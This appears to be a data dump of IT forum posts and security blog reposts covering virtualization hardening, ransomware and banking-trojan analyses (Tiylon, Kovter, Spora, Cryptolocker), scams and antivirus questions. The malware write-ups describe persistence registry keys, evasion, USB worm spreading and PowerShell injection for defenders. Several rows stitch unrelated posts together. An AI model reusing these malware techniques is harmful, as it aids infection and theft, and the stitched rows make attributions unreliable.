254929,When VMs get pwned: Real security in virtual environments,"This is the 97th article in the Spotlight on IT series. If you'd be interested in writing an article on the subject of backup, security, storage, virtualization, mobile, networking, wireless, DNS, MSPs or printers for the series PM Eric to get started.Spinning up a virtual machine (VM) without a good security policy, a hardened hypervisor, and virtual security controls is like swimming in a public pool with your mouth wide open—you may not contract a disease immediately, but eventually you’ll have a very bad day.I’m not sure why some administrators forget to harden their virtual environment. Perhaps they imagine it like the virtual realm of ""World of Warcraft""; if a VM gets pwned they can just return, ghost-like, and resurrect it. Personally, I think it’s more like the ""Tron"" universe; if data on your VM gets popped, it disappears ""IRL"" too. This article discusses the additional security risks hardware virtualization introduces, and shares a few quick virtual security best practices to mitigate those risks.A brief history of virtualizationThe concept of virtualization has existed since the inception of computing. Back in the mainframe days, and again when personal computers emerged, we virtualized our computers’ input/output (I/O) system via the operating system (OS). The OS (also called the supervisor) abstracts I/O functions so individual applications don’t have to “re-invent the wheel” and figure out how to handle them.Next, we wanted to run many programs at once, so we virtualized memory. Multi-tasking OSs like Windows present virtual memory pages to each application. Every application thinks it has all your computer’s memory resources, but your OS secretly virtualizes it.Finally, we come to virtualization as we know it today; specifically, hardware virtualization. Hardware virtualization allows us to abstract our computer’s hardware and run multiple OSs on one physical machine. In order to do this, hardware virtualization requires an additional authority to manage everything, called the hypervisor.Hardware virtualization presents many benefits, most of which you’re probably aware of. It saves us time, money, space, HVAC costs, and may even help us go green. So why hasn’t everyone virtualized everything? While there is no simple answer to that question, security is one major inhibitor.Virtual environments increase real-world risksHardware virtualization introduces new security risks and concerns. I’ve heard people generalize this risk as, “the same security issues as physical computers, just on virtual ones.” There’s some truth to that, but hardware virtualization also adds additional layers of concern. Let me share a few of those issues:Hypervisor security issues – I mentioned the hypervisor — the higher-level authority that abstracts your computer’s hardware, and manages multiple VMs. A hypervisor is just software, albeit complex software. Like all software, it can suffer from development bugs (buffer overflows and the like), which may result in security vulnerabilities. The hypervisor is a high-privileged system, so vulnerabilities in its software pose dire consequences. Hypervisors also introduce new management interfaces and services to your infrastructure, both of which present new targets for attackers. In short, hardware virtualization increases the potential attack surface of your network.Multi-tenant security issues – Running multiple computers on one physical platform introduces new problems. Information security has the concept of security domains. You segment resources by what they do, and how much you trust them. In the physical world, servers typically do one thing, so separating them is easy. In the virtual world, you can place many servers on one machine, making it more difficult to separate them by domain. Furthermore, VMs can communicate instantly with one another, sans a physical network. This leads to the “bad neighbor” syndrome, where one infected VM can quickly infect others on the same hardware, if configured improperly. Multi-tenancy also introduces data remnant risks, where one VM might access the data left in memory by another VM.Virtual network blind spot – I mentioned VMs can communicate with each other over a virtual network, never hitting a physical network. Though we have many great physical network visibility and security tools, they can’t see anything happening on virtual networks. Unless you implement virtual security controls, you won’t see the attacks until it’s too late.It’s relatively new and complex – While virtualization (even hardware virtualization) has been around for decades, many small business administrators only dove into it recently. Some of us are just starting to wrap our heads around virtual networking and switching, let alone learning how to harden hypervisors and implement virtual security controls. Additionally, some virtualization benefits complicate security. Its increased flexibility and mobility means you can copy and paste a VM instantly, but also allows you to quickly replicate, multiple, and further expose security mis-configurations. In short, virtual servers often move quicker than security policies can keep up.Those are just a few unique virtualization security concerns. VMs also suffer from “normal” computer security risks too – only these risks are further complicated by the liquid nature of virtual environments.Virtual attacks: From theory to realityYou might ask, “Well that sounds scary in theory, but are attackers really targeting virtualization?” In a word, yes.For instance, security researchers have demonstrated virtualization rootkits (Blue Pill), attackers have designed malware that avoids researcher VMs, and criminals have leveraged VMs as Command and Control (C&C) channels for botnets. Most recently, the Crisis malware included a spreading mechanism that searched for and infected virtual images, making it the first wild malware that specifically targets VMs.Security best practices for a virtual worldAt this point, you might be balking at the idea of virtualizing anything, but don’t worry. Virtualization’s benefits far outweigh its risks, and there are defenses for all these dangers. Here are a few virtualization best practices to get you started:Favor bare metal hypervisors over hosted ones – Without going into full detail, there are two types of hypervisors: those that run directly on hardware (Type 1), and those that run on top of an OS (Type 2). I recommend using a Type1 (or bare metal) hypervisor like VMware ESXi; the benefit being that it limits the scope of hypervisor attacks. For instance, an elevation of privilege attack against a Type 2 hypervisor may give an attacker full control of your native OS, whereas there is no OS to access on a Type 1 hypervisor.Segment your hypervisor’s management network – Hypervisors have management interfaces which you can access over a network. Make sure to separate this management network from other virtual and physical networks you don’t trust, and limit access to management interfaces.Disable unnecessary hypervisor services – Hypervisors provide many services to virtual machines, including access to USB devices, Bluetooth, disc drives, file services, physical network cards, and so on. They also provide ease-of-use features, like the ability to drag and drop files between virtual machines. Each of these services exposes more attack surface. If you don’t use it, disable it.Patch your hypervisor regularly – It’s software; it has vulnerabilities; patch it. Hypervisors fall into the class of things people tend to deploy and forget. Don’t let that be the case for you.Apply least privilege principles to hypervisors and guest VMs – You already know the least privilege principle, now extend it to your virtual environment. Who can manage the hypervisor, build new VMs, launch VMs, and what privileges do users on guest VMs have? These are all things you can control.Standardize your VM images – VMs move fast. People clone, copy, and redeploy them at the speed of file transfer. Badly configured VMs can spread security mis-configurations quickly. On the same token, creating a well-hardened, properly configured VM to use as a base image ensures your newly deployed virtual servers will at least start with secure defaults.Deploy virtual security controls – Today, virtual networks are a huge blind spot in our infrastructure. Though hypervisor vendors have started to provide some basic virtual security controls, they lack high-end security and visibility tools. Some third parties have started to provide these virtual security solutions. Consider using them.Extend normal security controls to VMs – The tips above help you specifically harden your virtual environment, but virtual machines still act like normal computers. They need OS and software patches, as well as normal host-based security controls like antivirus (AV). Luckily, there are solutions which help you apply such controls across multiple virtual machines at once.At the end of the day, all the information and network security practices we use to protect physical devices still apply to protecting the virtual ones. The only difference is we have to extend these practices across new surfaces, and introduce our familiar tools to new environments.  Once you understand the new attack surface that hypervisors and virtual networks present, you can start to mitigate these risks using familiar defenses. It’s just a matter of diligently doing what you already know.--Corey Nachreiner, CISSP, is Director of Security Strategy for WatchGuard.

Most of these security features are managed by our shop supervisors, and most of the actions taken are by other departments as well. Its not like we are becoming body guards for our company, but does it seem like a stretch to give IT these responsibilities? I personally don't really mind as long as I am not occupied with resetting access cards and cutting keys all day. Does this mean that we should be handling all camera requests as well? What do you think about IT having to manage physical security? Has anyone had to do this?  If so, how did it go? ",0

442648,EGADS! More Banking malware? Tiylon: A Modern Bank Robber,"Hello Spiceheads.If we're awake and drawing breath, odds are, someone somewhere is creating something to try to separate you from your hard earned Bitcoins-I mean money.Our man Christian Tripputi dropped a blog last night discussing the latest nasty little Banking malware:  Tiylon.  Dig it:﻿Tiylon: A Modern Bank RobberT﻿he biggest bank robbery of all time was identified in Brazil in 2005. In this case, a gang broke into a bank by tunneling through 1.1 meters of steel and reinforced concrete and then removed 3.5 tons of containers holding bank notes. This heist resulted in the loss of about 160 million Brazilian dollars (US$380 million).Robbers today, however, don’t have to bother with drilling through walls to steal money. They can rob a bank while sitting comfortably at home behind a computer. Thanks to cybercrime, organizations have suffered financial lossesin the order of millions. The Symantec State of Financial Trojans 2013 whitepaper shows that banking Trojans are becoming more prevalent. Apart from other more common malware such as Zeus and Spyeye, one of the most popular financial malware that cybercriminals currently use is a threat called Tiylon. This Trojan uses a man-in-the-browser (MITB) attack to intercept user authentications and transaction authorizations on online banking sites.Initial infection by targeted attackTiylon typically arrives as an attachment in the form of a short email to attempt to evade antispam filters. Unlike most spam campaigns associated with financial Trojans (like Zeus), Tiylon emails are part of a targeted attack. Symantec telemetry shows the attack targets online banking users  in several different regions around the world, with a particular focus on the UK, US, Italy, Australia, and Japan (Figure 2).Figure 1. Tiylon email with a malicious attachment.The threat consists of three different files: a downloader, a main component file, and a configuration file.Downloader fileThe downloader acts as a load point and is responsible for the installation of the main component file. When the downloader executes, it constructs system information derived by the computer’s serial number and establishes a connection to the attacker’s command-and-control (C&C) server. When the connection is established, a registry key is created.Windows XP:HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\“WwYNcov” = “%System%\WwYNcov.exe”Windows 7:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{905CC2F7-082A-4D1D-B76B-92A2FC7341F6}\“Path” = “\\xxUxqdT”The downloader then injects code into explorer.exe and svchost.exe to initiate malicious activity.Main component fileThe main component file is downloaded and decrypted by the Tiylon downloader file. This component collects a configuration file from the C&C server to specify the parameters of the attack. The component also manipulates registry settings to reduce the security of the computer and browser. This is also the component that intercepts communications between the user and financial institution websites.Core functionalities include the following:Performs Web injection attacksLogs key strokesCaptures screenshotsStarts FTP and RDP serversStarts Remote Desktop Protocol (RDP)Reads certificatesDownloads and executes filesCreate servicesHook operating system APIs in order to steal network dataInject code into other processesLog off, restart, or shut down the compromised computerPerform process injections into Web browsersTiylon attempts to evade detection by inspecting directories and installed applications. It also tries to find out if the computer is a virtual machine by checking the process list. If the C&C server finds any environment that could detect malicious activities, it may ban the computer’s IP address and then try to infect other users. It may also force some non Symantec antivirus software to set exclusions, helping the threat avoid detection. The malware code itself is obfuscated and has several packing cycles, which complicates analysis.Timeline of attacksThe Tiylon attacks occured between January 1, 2012, and October 1, 2013.Table 1. Tiylon attack numbers by countryFigure 2. Animation showing Tiylon attack numbers by countrySymantec protects customers against Tiylon with the following anitvirus and IPS detections:AV:Trojan.TiylonTrojan.Tiylon.BIPS:System Infected: Trojan.Tiylon.B Activity 3System Infected: Trojan.Tiylon.B ActivitySymantec recommends users to have the most up-to-date software patches and definitions in place to protect against threats. In this particular case, we suggest installing an antispam solution for your email client and refrain from opening suspicious attachments.﻿The hits just keep ooooonnnn comin.  Hit me up if you want more info or have questions on this or any other Symantec or security related item.",0

785356,KeePass LDAP integration,"I just found out that KeePass is not authenticating against our Domain User Account when using the ""Windows User Account"" encryption option as the database master key. This poses a HUGE risk as we use that method for ALL of our users' databases, which we wanted them to be able to access no matter which PC they are using in the organization. The biggest issue I see here is that we do not back up the local machines. The DBs are stored on the user's Home drive on our server. However, if the HDD fails on the local machine they used to encrypt their DB it will become inaccessible. This is NOT a good thing.Does anyone have any methods besides backing up the user accounts on EVERY local machine that could make this a smaller risk? Maybe LDAP integration or somehow using the domain account instead of the local PC user account as the encryption key?? I need to get this figured out ASAP as my CEO is freaking out!",0

1702053,New strain of fileless malware poses as a Firefox update,"Copying from our malware research team's blog post:Late last week, we received an alert indicating malicious behavior on one of our Early Access users’ systems. Upon further investigation, it was determined the user had been protected from a drive-by-download — after visiting an infected website they had been tricked into installing malware that was masquerading as a legitimate Firefox browser update.Analyzing the malware, we discovered it was a new variation of Kovter, a malware family known for hijacking computers, installing RATS (Remote Access Trojans), executing click-fraud campaigns, and even executing some ransomware.What makes this new variant particularly nasty is that it's the later fileless version of Kovter, and it's now using an apparently legitimate certificate (see below). That's bad news because a legitimate certificate causes plenty of traditional antivirus/endpoint solutions to give the software a pass.﻿Mitigatation and preventionIn this user’s case, we were able to stop the attack before it could do any damage. And the good news is if you have Barkly installed and protection turned on, you’ll be covered against this attack (and other attacks like it), too.That's true even if attackers make additional changes in an attempt to disguise future iterations, because Barkly doesn’t need to recognize specific malware signatures in order to detect them and stop them from doing harm. It simply watches malware’s behavior as it attempts to execute, and shuts it down when it sees it trying to do something it shouldn’t.Since we first discovered this particular strain of Kovter antivirus vendors are starting to update their coverage to block it, as well. What makes that really exciting is that we were able to kick-start this expansion of protection without any harm coming to the “patient zero” who first suffered the attempted attack.We’ve also reported the signature abuse to COMODO so they can look into revoking the certificate.﻿What you can do nowIn the meantime, encourage your users not to install any Firefox updates outside of the standard Firefox process. To stay updated, users simply select the Firefox “Help” menu and choose the “About Firefox” option. Firefox will automatically check to see if the user’s browser is up-to-date and provide a method for getting an update if necessary.﻿Deeper diveWhen we performed a post-mortem analysis, we searched for the hash (and various other file attributes) in various community resources, but we could not find a reference to the file itself. This was a previously unknown sample, which, after some analysis, we attributed as Kovter.You can see the sample information we uploaded to VirusTotal here.As it executed, the malware wrote an embedded and encoded script in various locations in the Windows registry that would execute PowerShell.exe. After we decoded the registry key, we found... another encoded Powershell program! Eventually, we saw PowerShell being used to inject shellcode in the system. By comparing the decryption loop to this Kovter write-up, we confirmed this was most likely a Kovter variant. Kovter has undergone some major changes in the past few years. As CyberReason observed, the malware can be remotely reprogrammed with more advanced capabilities.   ﻿Additional tips for preventing attacksGood user education can generally go a long way to reducing attacks, but as this particular attack demonstrates, even the best of us can be tricked into installing something that appears to be legitimate, or accidentally doing something we wish we could undo.That makes good security hygiene all the more important. If you haven’t already, it’s a smart idea to adopt the following habits:Limit your users’ access and privilegesKeep your software patched and up-to-date, including your antivirusEncourage your users to be skeptical of unsolicited or unusual requirements for updates, upgrades, or downloadsAs this new Kovter variant shows, malware is increasingly using sophisticated methods when hiding from the operating system and traditional security tools. That’s why we’re using our new form of behavior-based analytics to improve the protection of traditional security solutions like antivirus.While no single solution is a silver bullet, with the right layers of security tools and practices in place you can protect your users from threats like this — even if they’ve never been seen before.Learn more and try Barkly out by signing up for Early Access.

Department;Threat and Cybercrime Trends: Bogus Microsoft Software Removal Tool Leads to FAKEAVAnother attempt by cybercriminals to further their malicious activities was recently discovered by Trend Micro TrendLabs. Working like other FAKEAV malware—it masquerades as a legitimate tool and, when executed, displays a fake scanning alert notifying the users that their systems have indeed been infected. From the interface down to the icon, it completely mimics the authentic MSRT.This threat, discovered by senior threat analyst Edgardio Diaz and detected by Trend Micro as TROJ_FAKEAV.MSRT, presents itself as a Malicious Software Removal Tool (MSRT), remarkably similar to the tools that Microsoft doles out in its security patch updates.Complete info link: http://www.trendmicroupdate.com/11781/spotlight.htm",5

71814,Can not install certificate in local Cisco VPN client," Hello,We have a Cisco ASA 5510 handling VPN with certificates from a Microsoft 2003 Standard Server with a Standalone CA server configured on it. A few weeks ago our cert on our ASA expired against the CA server and we reapplied for a new cert to the ASA. Users who still have a valid cert against our CA server can use these certs to authenticate to VPN and gain access. So that's good but the bad news is if your cert expired, you can not reapply for a certificate nor can a brand new system apply for a certificate. Like I said, we can run existing certs against the ASA and I know that creating a group auth account works (which has been the work around for the time being for the expired cert users).If I try to do SCEP enrollment via http, I get an ""Error 42: Unable to create certificate enrollment request."" From Cisco's site, this is what the error means ""Description or Action:The VPN Client was unable to create an enrollment request to enroll the certificate with a certificate authority.""If I try it via creating a cert file enrollment on the client, enrolling manually through the CA and export out a file to import into the VPN client, I get ""Error 39: Unable to import certificate."" which this description is ""Description or Action: The VPN Client was unable to import the certificate. The file path for the certificate may be incorrect or there may be a problem with the file system.""Below I put the 2 separate logs from the client when I try to do it's respective action.Btw...I have spoken to both Microsoft support and Cisco TAC about my problems and both point fingers at each other.

We recently upgraded to Sophos Enterrprise Console 5.3.1 but are still running the old Safeguard Safeguard product (5.50.1.17) on a separate Server. We are Windows 7 clients throughout but I want to move to Windows 10 ASAP.It was my understanding that later Safeguard encryption products were integrated into the Enterprise Console but I have now heard via another source that Sophos intend to separate them out again and Safeguard will be a separate product. I've been told that the encryption feature in Enterprise Console will be unsupported as of April 2016.Just wondering if others had issues with the previous encryption functionality in the Enterprise Console?Also re: Windows 10 options. Anyone using Safeguard yet to encrypt Win 10 machines (is there even a version yet that works with Win 10) and if so what version?I'm considering using Bitlocker if I need to move to Windows 10 in the interim. Would appreciate some feedback on how people find that also. cheers,0

2108203,Are we seeing the last of ransomware with criminals moving to crypto-mining?,"In six months will we look back on ransomware as old-timey?For cybercriminals, the last few years have been all about ransomware. But it looks like that's changing fast. According to multiple reports, more and more cybercriminals are giving up on ransomware and turning to crypto-mining as the hot new thing. Take a look at this chart from Malwarebytes (full report here) that illustrates just how significant the drop in ransomware during the past six months has been:On the flip-side, crypto-mining malware is exploding. According to Check Point’s Global Threat Index, two of the three most prevalent malware variants in December 2017 were cryptocurrency-miners. The change makes sense. For one thing, dropping crypto-miners on a victim machine is an even more direct route to cryptocurrency than encrypting files and hoping victims will fork it over. In a way, it's criminals simply finding a way to cut out the (often unwilling) middleman. There's also the emergence of alt-coins like Monero that provide even greater anonymity than Bitcoin. Coincidentally, Monero's price has gone up significantly in the past few months.Ransomware obviously isn't going to vanish completely anytime soon (especialy not when there are still campaigns like the recent SamSam attacks that just made $325,000 in 4 weeks). But the numbers do indicate it's currently a threat on the decline rather than the rise. What about it, everyone? Do these numbers match up with what you're seeing? Do you think crypto-miners will continue to replace ransomware as the most prolific malware?",0
150911,"The truth behind the ""Shady RAT""","McAfee published an interesting report recently about what they called Operation Shady RAT, focusing on a series of what some may call “advanced persistent threat” attacks. The attacks were dubbed in some quarters as “one of the largest series of cyber attacks ever.” While quite a bit of data was presented regarding the potential scale of these attacks, details on the threats and how the attacks were staged were somewhat limited.Based on the information we managed to glean from the report and our own intelligence sources, we have identified the initial attack vectors, the threats used and how the attack was staged. In addition to all this, we have also uncovered what appears to be the same information source about the victims of the attacks that was used by McAfee as the basis of their report. This information is freely available on the attackers’ command and control site, which is a strange oversight considering this type of attack is often described as “advanced” or “sophisticated.”Without further ado, let’s dig deeper into these attacks and see how they work from end-to-end. The attack mainly comprises of three stages, which are detailed below.Click the below link to read on:http://www.symantec.com/connect/blogs/truth-behind-shady-rat",11

2098736,BBB Study Shows Growing Problem of Tech Support Scams,"Despite our best attempts to educate users on cyber threats to look out for, there are still a number of people being tricked by hackers who pose as expert computer techs, using advanced marketing and sales techniques to terrify consumers into buying fake repairs for their home and business computers. *sigh*A recent study of tech support scams conducted by the Better Business Bureau said this:“Microsoft – whose corporate name is often used by thieves to dupe consumers – reports receiving 12,000 complaints worldwide every month. While the ages of potential and actual victims vary, Microsoft says that millennials are most likely to continue with a fraudulent tech support offer, while older consumers are more likely to file complaints.”Usually, these scammers will target victims by using warning screens, cold calls, sponsored links, and emails. Now, some possible easy solutions for these scams would be to:Continue educating and informing users on these types of threatsRecommend your users contact you first, and then remotely accessing that computer to confirm whether that message is in fact a scam. There’s a bunch of free remote supports options out there (ex: ConnectWise Control Free). Additionally, check out eight security features your remote solutions should have in our recent e-guide, here.Rebooting that computer to eliminate the false warning screensHow often do you share these types of cyberthreats updates to your users? Do you see improvement in minimizing cyberthreats when you do so?

2186779,Your Security Vendor Should Integrate with More Than Just Your RMM and PSA,"For many MSPs, integrating their security solution with their remote monitoring and management (RMM) and professional service automation (PSA) platforms is essential for doing business. Together, these platforms help lower the cost of keeping up with each client, ensuring profitable margins for a healthy, growing business.For true providers of IT services—MSPs that sell services rather than licenses and take a holistic approach to client IT health—RMM and PSA integrations are critical for keeping track of hundreds or even thousands of unique endpoints and automating recurring operations for numerous clients.Like many of the other features of our security solutions, our RMM and PSA integrations are custom-built with the needs of MSPs in mind. They’re designed to help MSPs create the most efficient, well-oiled versions of their businesses possible so that service is prompt, solutions are effective, and profit is preserved.   Here’s what you should expect from your RMM and PSA security integrations:Faster rollouts- One of the core benefits of RMM-assisted deployments, expect rollouts to new endpoints to be fast and hassle-free with well-designed integrations. New endpoints should be easy to set up with protection turned on in just a few clicks.Simplified management- Efficiency is key to profitability. So a centralized dashboard displaying what’s running, what’s broken and how, infection statuses, endpoints requiring attention, and more helps increase the number of endpoints a single technician can manage, boosting efficiency and, ultimately, profitability. The data you need- The best RMM and PSA integrations make it possible to get the data you need to run a successful business. Whether it’s per-client data for calculating a client’s cost to you, information on policy settings for sites and endpoints, or additional reporting delivered to clients to promote peace-of-mind, having access to all of your data empowers decision-making. Integrations don’t have to end thereIntegrating disparate products can be a laborious, time-intensive process. For that reason, many security vendors are reluctant to coordinate too closely with customers to automate functions unique to their businesses. But it doesn’t have to be that way. Advanced plugins and tools allow for complete customization of dashboards, reporting, and data tracking. Each can be customized to track the metrics most useful to the organization. Critical processes, like issuing periodic reports, can be fully automated. This can be extremely beneficial when it comes to communicating with customers. Weekly or monthly reports demonstrate that, despite a lack of any major security incidents, it wasn’t for lack of trying on the part of cybercriminals. More than simply allowing different business platforms to talk to one another, integration plugins can be used for running commands and performing actions. This includes creating, modifying, or deleting licenses, removing duplicate endpoints, or quickly creating new console sites. Insist on better integrationsSo when considering which cybersecurity vendor offers the most for your MSP, consider not only whether the solution allows you to communicate with your RMM and PSA platforms, but also how deeply. Does the vendor have a dedicated integrations team? Do they offer tools for the customization of business-specific reporting? Can essential, recurring business processes be automated?The answers to the questions above will help you determine how much value RMM and PSA integrations add for your business. In a market where margins can be razor thin and built-in efficiencies can make or break the bottom line, the answers may make all the difference.If you like this story, visit the Webroot blog for more. ",12
789482,Antivirus Requirement,"For all of you out there who have or are going through some sort of compliance effort, whether it's PCI or SOC2, how do you guys handle requirement 5.1 for antivirus and the respective requirement for SOC2? The company that I work for is in the process of going through both compliance efforts, and are a little bit confused as to what is going to be required of us as far as antivirus is concerned. The way that the requirement reads to me, one would have to have antivirus on every single computer which could be considered in scope, including servers and workstations alike. In our specific environment, we do have computers without antivirus, but any workstation without antivirus cannot get out to the web. Also, servers, we have nearly 100 servers in our production environment, does that mean we need to install antivirus on 100 servers? Can we get away with installing it only on internet facing servers (FTP, Web), or does it have to be on all of them? Does SOC2 differ from PCI in this regard? What do you guys do when it comes to putting antivirus on servers?Any and all help is appreciated! ",12

1958926,[ALERT] USB Sticks Could Infect Your Network With New Spora Ransomware Worm,"The new Spora ransomware strain has now been dissected by more malware researchers and the team from G Data discovered that Spora uses an ""innovative"" way to spread itself via USB sticks. This strain is highly sophisticated and could become the ""New Locky"".  Spora has well-implemented encryption procedures that do not need a Command & Control server, a user-friendly payment site, choice of different “packages” that victims can opt for including immunity from future attacks, and Ransomware-as-a-Service capability. Infection vector is email attachment with HTA file Spora uses an HTA file with obfuscated VBScript code, and arrives in an email attachment with a ZIP file. Once the user falls for the social engineering tactic and double-clicks the ZIP, the HTA file writes a JScript file called close.js to disk and executes it.The JScript file in turn is a dropper for a Word document and an .exe file that are both written to disk and opened by close.js, with the result the document will be opened by Word or WordPad, but an error message is shown because the file is corrupt. Meanwhile back at the ranch, the .exe that was run has a seemingly random name hardcoded by the dropper but contained the actual payload.Spora Exhibits Worm-like Behavior Using .LNK filesRansomware that behaves like a worm has been spotted before with the ZCryptor strain, which uses the old autorun.inf, but Spora goes further than that, borrowing new technology from other malware which uses Windows shortcuts (.LNK files) instead. Spora adds the hidden .LNK attribute to files and folders on the desktop, in the root of USB drives and the system drive.These hidden files and folders are, with the standard folder options, not visible anymore. Spora then replaces Windows shortcuts with the same name and icon as the hidden files and folders. Those .LNK files open the original file to avoid raising any suspicion but at the same time execute the malware and the worm copies itself as hidden file alongside the .LNK files.Spora ransomware goes globalData gathered by the ID-Ransomware service shows what was expected; Spora has started to spread to new territories outside former Soviet states. It was first spotted in the wild during the first week of the year, and its first version featured a ransom note only in Russian, meaning its distributors were only targeting territories with Russian-speaking users. Last week, things changed, when Spora was identified in multiple ransomware distrubtion campaigns. ID-Ransomware started registering uploads of Spora-encrypted files from users outside the former Soviet territory. Countries like Saudi Arabia, Austria, or the Netherlands, became hotspots of Spora infections. Treat this like a heads-up, America will follow shortly. Spora now spreads via exploit kits and spam wavesA new development is that security researchers Brad Duncan and Malware Breakdown have now spotted RIG-v exploit kits spreading Spora, and it's only the start of things. MalwareHunterTeam is keeping an eye on a malware distribution server that had been used to host multiple ransomware strains in the past few days, such as Cerber, Locky and Spora. This server had been used combined with spam floods, not exploit kits, which shows two different Spora distribution methods being used at the same time. Users would receive emails with malicious attachments that contained code that downloaded the Spora binary from the distribution server.Spora includes support for a ""campaign ID,"" a parameter used to track both the effectiveness of different spam runs, but also different groups renting Spora from its creators. The jury is out if Spora has been made available as a Ransomware-as-a-Service offering, but what is sure is that this malware has now become a global threat.Anyone bringing a USB stick to the office is now a possible ransomware infection vector.Simply navigating through the folders on your system or desktop using double-click will execute the worm. Using this strategy, it will not only spread to USB thumb drives, it will also encrypt newly created files on the system.  Anyone getting infected at the house with Spora and bringing their USB sticks to the office is now an infection vector.The GData team noted that Spora deletes shadow volume copies and disables Windows error recovery and startup repair, but does not bypass User Account Control (UAC) yet, meaning at this point the user will be asked whether the malware is allowed to make changes.

I have each computer set to do a Quick Scan every day except Thursdays (Full Scan day), but I think Vipre is trying a little harder than that. I've seen from a lot of people that Vipre boasts 40-50MB RAM usage, and I understand that number can be grey depending on the environment it's in (which may be why it's not a Vipre issue); however, on every computer in our company Vipre runs at a minimum of 230MB. This is completely universal, regardless of the computer having HDD/SSD, 2GB or 16GB of RAM, it doesn't matter. Is there anything wrong I could have set up in the console for it to do this? This isn't only while scanning, either. This is 24/7 in standby mode and during scans.As a separate issue, Vipre has been doing this to my computer (i7, 16GB RAM, 240GB SSD) for the past two hours.I literally have about 15GB of data on my machine that is not used by Windows, of course which I have most of their files in the Exclusion List because of Microsoft's Recommendations (GroupPolicy, Security, SoftwareDistribution, etc).

Full disclosure, a lot of my end users are getting really pissed off that Vipre reserves two hours out of the work day to scan. It's been set this way since I started, is there any advantage to having it during work hours rather than after?As a side note, would people that use Vipre mind letting me know how they use it in their environment so I can see if I have something mis-configured that could be better for my company? I realize this is a lot of information to give everyone when they don't know my configuration, which is why I still stand by my statement that Vipre might not actually be the issue.  If this sounds arrogant, I apologize, I need food and I've had too much coffee",0

1772994,Cryptolocker Warning Email Template,"What is CryptoLocker?CryptoLocker is a ransomware program that was released in the beginning of September 2013 that targets all versions of Windows computers. This ransomware will encrypt files using a strong encryption that is almost impossible to crack. When it has finished encrypting your files, it will display a CryptoLocker payment program that prompts you to send a ransompayment in order to decrypt the files. If the payment is not made in time, access to all of the files will be lost. The only good way to recover from CryptoLocker is restoring from a backup (if you have one, and hopefully it's recent). How do you become infected with CryptoLocker?This infection is typically spread through emails sent to company email addresses that pretend to from Fedex, UPS, DHS, or even invoices. These emails traditionally contain a zip file that when opened will infect the computer. These zip files contain executables that are disguised as PDF files , office files or any sort of document that can use macros. The infection can also spread and wreak havoc on your network if not stopped. According to Newsweek, in 2015 affected Americans paid about $325 million due to ransomware attacks; in 2016 cyber security analysts estimate it will be much higher.How to prevent infectionDo not open emails from unknown senders. If you see anything suspicious, feel free to forward the email to help@yourcompany.net, or you can open a ticket by right-clicking your helpdesk icon and selecting ""Create Service Ticket"".",11

76206,Symantec Corp Antivirus Ver 10,"I've seen the multi-multi page threads from all the Symantec haters on this forum, but rather than jump into the fray there, I want to just post this and hopefully get some feedback. We've had Symantec Corp Antivirus for quite a few years (old ver 9), and have never had a single problem with it to speak of. Last year when I renewed my license they tried to get me to go to the new Endpoint Protection but I said no thanks, all I want to do is keep getting dat updates. (I had been hearing negative rumblings about it so I wanted to steer away from it.)Last week I was talking to Symantec support and since my old Ver 9 has passed the End of Life Cycle they told me to at least download the Ver 10 of regular Symantec Corp Antivirus (not Endpoint Protection) and install it, but that it would have the System Center where I could manage the clients, etc. like Endpoint Protrection does. My understanding is that this is not the Endpoint Protection package but more like the old Corp Antivirus. It is at Ver 10.1.8 right now, which they care calling 10.2.Anyone have any experience with this? I'm wondering should I go ahead and cut over to it or possibly look at another package altogether. My shop currently has only one Windows 2003 server and about 50 clients, and I'm the sole IT support.Thanks in advance. ",0

1518811,Cryptolocker: When Antivirus Cannot Help,"There is currently much talk about Cryptolocker and other kinds of ransomware. Cryptolocker is such kind of malicious program that, once it is active, starts encrypting files it can access on a local system or on network shares and then threatens to hold your data hostage until you pay.Users get this executable via spam or phishing emails. It starts working as soon as the user double-clicks the file. Hence traditional antivirus products are rarely efficient against Cryptolocker. The trouble is, unlike most malware, Cryptolocker can work in user security context and don’t require local admin level access to cause the data loss.It’s hard to detect Cryptolocker immediately: while your computer keep on working personal files and documents are encrypted. Encryption process requires time and resources, and not entire volume is encrypted at once. We’ve seen the process speed estimates at around 1000 files per minute, but in theory, in case of a large storage it is possible to notice unusual behavior and stop the process early enough to minimize the damage.Prevention stepsMost of the recommendations include a general combination of steps to prevent the data loss:E﻿nsure using spam filtering (web and desktop) solutions to prevent ransomware spreading.Use solutions that enable heuristics and behavior analysis, not just signature-based ones.Enable “software restriction policies”. These can disallow running ANY executables except those specifically whitelisted by admins.Backup data daily/continuously to avoid damage.Train users to make them aware of the risk and reduce the chance someone would run the malicious executableHow to detect cryptolockerFirst thing that you should do is to configure Group Policy change and configuration audit to make sure software restriction policies are in place and file server audit is enabled. Monitor 4656 Event ID in event log with WRITE ""Accesses"" string, for file modification detection. A tool that might be helpful to fight Cryptolocker, must be capable of the following:Watch file shares for changes and notice massive file modifications done by the same process in real time (e.g., within a minute or faster)Automatically kill that process – and possibly disable the user account to prevent further infectionNotify administrators with the full list of files that need to be restored from backup﻿How do you fight with cryptolockers?",11

I also know that it would be real simple for the company to protect itself, yet the individuals who are enacting this, specifically stated that this is what they want even after my warning.Ok so my pre-clarification was kinda vague... We hired a consultant who is attempting to boost our customer service department's effectiveness and so far, she really hasn't done a lot but cause the manager of that department to pull his hair out. It's kinda funny. But very recently she has asked to start listening in on the conversations of the department. Normally I would have no issue with this, and in fact, it has become standard practice here in the states. However, In my law classes, specifically dealing with Alabama's wiretapping and eavesdropping laws, It states that at least one party know they are being recorded or listened in on. Even in the business environment. When told that we need to inform our customer service personnel about this eavesdropping, the Consultant said that would be completely counter productive to what she is trying to do and the CSRs do not need to know.I have done the research, and nowhere in our employee handbook or any other written document does it say that we can do this or that we reserve the right. But it does say that we can review communications, pointing out Web traffic, email, and voicemail. but nothing specifically dealing phone conversations. One of the guys in my department is more than eager to set this up and repeated tell me delighted he is to do so. This is also a guy that really loves eavesdropping... What do I do? ",0

